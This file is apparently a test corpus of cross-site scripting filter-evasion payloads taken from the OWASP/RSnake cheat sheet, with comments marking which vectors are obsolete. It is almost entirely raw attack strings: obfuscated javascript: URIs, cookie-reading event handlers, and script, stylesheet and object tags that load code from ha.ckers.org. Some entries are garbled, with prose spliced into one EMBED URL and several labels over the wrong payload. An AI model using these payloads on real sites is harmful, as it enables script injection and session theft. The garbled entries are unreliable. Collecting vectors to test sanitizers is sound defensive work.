#
# https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
# based on the RSnake original http://ha.ckers.org/xss.html
# Retrieved on 2013-11-20
# Much of this wildly obsolete
#

# XSS Locator 2
'';!--"<XSS>=&{()}

<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>

<IMG SRC="javascript:alert('XSS');">

<IMG SRC=JaVaScRiPt:alert('XSS')>

# Grave Accent Obfuscation
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>

# Malformed A Tags
# (not actually malformed)
<a onmouseover="alert(document.cookie)">xxs link</a>
<a onmouseover=alert(document.cookie)>xxs link</a>

# Malformed IMG Tags
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">

# fromCharCode
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

# Default SRC tag to get past filters that check SRC domain
<IMG SRC=# onmouseover="alert('xxs')">

# Default SRC tag by leaving it empty
# nickg; Unable to replicate in FF,Safari,Chrome 2014-01-10
# <IMG SRC= onmouseover="alert('xxs')">

# Default SRC tag by leaving it out entirely
<IMG onmouseover="alert('xxs')">

# Decimal HTML character references
# obsolete?
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC="/" onerror=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>

# Decimal HTML character references without trailing semicolons
# obsolete
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC="/x" onerror=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>

# Hexadecimal HTML character references without trailing semicolons
# obsolete form
 <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="/" onerror=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>

# Embedded tab
# obsolete form
#<IMG SRC="jav   ascript:alert('XSS');">
<IMG SRC="/x" onerror="jav      ascript:alert('XSS');">

# Embedded escaped tab
# obsolete form
#<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="/" onerror="jav&#x09;ascript:alert('XSS');">

# Embedded newline to break up XSS
# obsolete form
#<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">

# Embedded CR
# obsolete form
#<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG SRC="/x" onerror="jav&#x0D;ascript:alert('XSS');">

# Null
# obsolete form
# <IMG SRC="jav%00ascript:alert('XSS');">
<IMG SRC="/x" onerror="jav%00ascript:alert('XSS');">

# Spaces and meta chars before the JavaScript in images for XSS
# obsolete form
#<IMG SRC=" &#14;  javascript:alert('XSS');">
<IMG SRC="/x" onerror=" &#14;  javascript:alert('XSS');">

# Non-alpha-non-digit XS
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>

# this is bogus or obsolete
# <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>

<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>

# Extraneous open brackets
<<SCRIPT>alert("XSS");//<</SCRIPT>

# No closing script tags
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >

# Protocol resolution in script tags
<SCRIPT SRC=//ha.ckers.org/.j>

# Half open HTML/JavaScript XSS vector
<IMG SRC="javascript:alert('XSS')"

# Double open angle brackets
<iframe src=http://ha.ckers.org/scriptlet.html <

# Escaping JavaScript escapes
# N/A

# End title tag
</TITLE><SCRIPT>alert("XSS");</SCRIPT>

# INPUT image
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">

# BODY image
<BODY BACKGROUND="javascript:alert('XSS')">

# IMG Dynsrc
# Wildly obsolete
<IMG DYNSRC="javascript:alert('XSS')">

# IMG LOW src
# Wildy obsolete
<IMG LOWSRC="javascript:alert('XSS')">

# List-style-image
# likely obsolete
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>

# VBscript in an image
<IMG SRC='vbscript:msgbox("XSS")'>

# Livescript (older versions of Netscape only)
# Obsolete
# <IMG SRC="livescript:[code]">

# BODY tag
<BODY ONLOAD=alert('XSS')>

# BGSOUND
<BGSOUND SRC="javascript:alert('XSS');"

# & JavaScript includes
# Obsolete
# <BR SIZE="&{alert('XSS')}">

# STYLE sheet
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">

# Remote style sheet
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">

# Remote style sheet part 2
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>

# Remote style sheet part 3
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">

# Remote style sheet part 4
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>

# STYLE tags with broken up JavaScript for XSS
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>

# STYLE attribute using a comment to break up expression
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"

# IMG STYLE with expression
# N/A

# STYLE tag (Older versions of Netscape only)
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>

# STYLE tag using background-image
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>

# STYLE tag using background
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>

# Anonymous HTML with STYLE attribute
<XSS STYLE="xss:expression(alert('XSS'))">

# Local htc file
<XSS STYLE="behavior: url(xss.htc);">

# META
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">

# META using data
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">

# META
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">

# IFRAME
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>

# IFRAME Event based
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>

# FRAME
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>

# TABLE
<TABLE BACKGROUND="javascript:alert('XSS')">

# TD
<TABLE BACKGROUND="javascript:alert('XSS')">

# DIV background-image
<TABLE BACKGROUND="javascript:alert('XSS')">

# DIV background-image with unicoded XSS exploit
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.

# DIV background-image plus extra characters
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">

# DIV expression
<DIV STYLE="width: expression(alert('XSS'));">


# "Downlevel-hidden block"
<!--[if gte IE 4]> <SCRIPT>alert('XSS');</SCRIPT> <![endif]-->

# BASE tag
<BASE HREF="javascript:alert('XSS');//">

# Object tag
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>

# Using an EMBED tag you can embed a Flash movie that contains XSS
<EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf" AllowScriptAccess="always"></EMBED>

# You can EMBED SVG which can contain your XSS vector
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>

# Using ActionScript inside flash can obfuscate your XSS vector
# N/A

# XML data island with CDATA obfuscation
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>

# Locally hosted XML with embedded JavaScript that is generated using an XML data island
<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>

# XSS using HTML quote encapsulatio
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>


